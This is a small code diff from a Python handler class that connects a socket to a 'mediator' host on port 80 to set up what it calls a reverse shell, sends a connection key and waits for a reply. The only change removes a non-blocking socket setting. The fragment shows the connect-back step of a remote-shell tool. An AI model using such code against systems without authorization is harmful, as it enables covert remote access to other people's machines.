@@ -153,7 +153,6 @@ class Handler:
         # connect to moderator on operator port
         print("Connecting to reverse shell...")
         self.shell.connect((gethostbyname(mediatorHost), 80))
-        self.shell.setblocking(0)
         # send verification
         self.shell.sendall(self.connectionKey.encode())
         ready, _, _ = select.select([self.shell], [], [])
